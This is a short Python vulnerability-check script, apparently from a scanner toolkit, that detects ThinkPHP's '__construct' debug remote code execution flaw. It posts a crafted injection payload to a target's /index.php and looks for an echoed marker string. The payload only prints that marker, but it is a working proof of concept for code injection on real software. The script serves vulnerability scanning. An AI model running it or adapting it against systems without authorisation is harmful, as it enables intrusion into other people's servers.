# encoding: utf-8
'''
@Version:   V1.0
@Author:    JE2Se
@Contact:   admin@je2se.com
@Website:   https://www.je2se.com
@Github:    https://github.com/JE2Se/
@Time:  2020/6/10 17:07
@File:  ThinkPHP_Construct_Debug_RCE.py
@Desc:
'''
import requests
from lib import *
from lib.Urldeal import umethod
import logging

def ThinkPHP_Construct_Debug_RCE(Url):
    scheme, url, port = umethod(Url)
    headers = {
        "User-Agent":  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:49.0) Gecko/20100101 Firefox/49.0",
    }
    payload = {
        '_method': '__construct',
        'filter[]': 'print_r',
        'server[REQUEST_METHOD]': '56540676a129760a3',
    }
    try:
        payload_url = scheme + "://" + url + ":" + str(port) + "/index.php"
        resp = requests.post(payload_url, headers=headers, data=payload,timeout=6, verify=False)
        con = resp.text
        if r"56540676a129760a3" in con:
            print(Vcolors.RED +"[!] 存在ThinkPHP远程命令执行漏洞:->ThinkPHP_Construct_Debug_RCE\r" + Vcolors.ENDC)
    except:
        logging.error("ThinkPHP_Construct_Debug_RCE脚本出现异常")